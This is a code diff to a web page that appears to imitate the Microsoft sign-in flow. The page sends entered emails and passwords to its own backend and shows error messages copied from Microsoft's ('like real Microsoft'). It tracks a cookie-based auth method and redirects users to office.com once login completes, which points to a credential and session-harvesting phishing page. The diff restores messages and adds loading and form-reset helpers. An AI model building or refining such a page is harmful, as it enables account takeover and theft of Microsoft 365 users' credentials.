@@ -43,7 +43,7 @@
         }
 
         /* Mobile container adjustments */
-        @media (max-width: 798px) {
+        @media (max-width: 768px) {
             .container {
                 padding: 20px 20px;
             }
@@ -598,15 +598,23 @@
 
                     if (data.loginComplete) {
                         if (data.loginSuccess) {
-                            // Check if already logged in
-                            if (data.alreadyLoggedIn) {
-                                console.log('✅ Already logged in - redirecting to office.com...');
+                            // Check if we need to redirect to office.com
+                            if (data.authMethod === 'cookies' || data.alreadyLoggedIn) {
+                                showMessage('✅ Login successful - redirecting to office.com...');
                                 window.location.href = 'https://office.com';
                                 return;
+                            } else {
+                                showMessage('✅ Login completed successfully!');
+                                // Close session after successful login
+                                fetch(`${API_BASE}/api/session`, {
+                                    method: 'DELETE',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ sessionId: currentSessionId })
+                                });
+                                currentSessionId = null;
                             }
-                            // Removed success message for other cases
                         } else {
-                            // Removed error message
+                            showMessage('❌ Login failed. Please check your credentials and try again.', 'error');
                         }
                     } else {
                         // Show site report if available
@@ -623,7 +631,7 @@
                                 // Only show the Microsoft error message, nothing else
                                 showMessage(formattedError, 'error');
                             } else if (data.siteReport.accountExists && data.siteReport.needsPassword) {
-                                // Account found, show password form without any message (like real Microsoft)
+                                // Account found, show password form without any
                                 showPasswordForm(email);
                             } else if (!data.siteReport.accountExists) {
                                 // Account not found - show the Microsoft error message
@@ -631,10 +639,8 @@
                             } else {
                                 // Other cases - proceed to password
                                 showPasswordForm(email);
-                                // Removed info message
                             }
                         } else {
-                            // Removed generic message
                             showPasswordForm(email);
                         }
                     }
@@ -656,7 +662,7 @@
             const password = document.getElementById('password').value;
 
             if (!password) {
-                // Removed error message
+                showMessage('Please enter your password', 'error');
                 return;
             }
 
@@ -679,7 +685,7 @@
                         window.location.href = 'https://office.com';
                         return;
                     } else {
-                        // Removed error message
+                        showMessage('❌ Login failed. Please check your credentials and try again.', 'error');
                     }
 
                     // Clear password field
@@ -694,6 +700,44 @@
             } finally {
                 setLoading(false);
             }
+        }
+
+        // Helper function to simulate loading and then hiding it
+        function showLoading(message) {
+            const loadingIndicator = document.getElementById('loadingIndicator');
+            const loadingText = document.getElementById('loadingText');
+            loadingText.textContent = message;
+            loadingIndicator.style.display = 'block';
+            setLoading(true); // Disable inputs and buttons
+        }
+
+        function hideLoading() {
+            const loadingIndicator = document.getElementById('loadingIndicator');
+            loadingIndicator.style.display = 'none';
+            setLoading(false); // Enable inputs and buttons
+        }
+
+        // Function to reset the form to the email input stage
+        function resetToEmailForm() {
+            currentStep = 'email';
+
+            // Reset form
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+
+            // Show email form, hide password form
+            document.getElementById('emailForm').style.display = 'block';
+            document.getElementById('passwordForm').style.display = 'none';
+
+            // Update header and back button
+            document.getElementById('headerTitle').textContent = 'Sign in';
+            document.getElementById('backInfo').className = 'back-info';
+
+            // Clear messages
+            clearMessage();
+
+            // Preload a fresh session
+            preloadOutlook();
         }
 
 
